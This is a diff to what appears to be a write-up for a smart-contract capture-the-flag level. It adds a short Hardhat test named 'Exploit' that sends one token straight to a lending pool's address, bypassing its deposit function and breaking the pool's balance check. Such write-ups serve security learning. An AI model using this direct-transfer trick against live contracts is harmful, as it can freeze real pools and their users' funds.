@@ -89,5 +89,7 @@ In order to beat the level, we need to send tokens to the SC directly, bypassing
 # Attack function
 
 ```
-
+it("Exploit", async function () {
+  await this.token.transfer(this.pool.address, 1);
+});
 ```
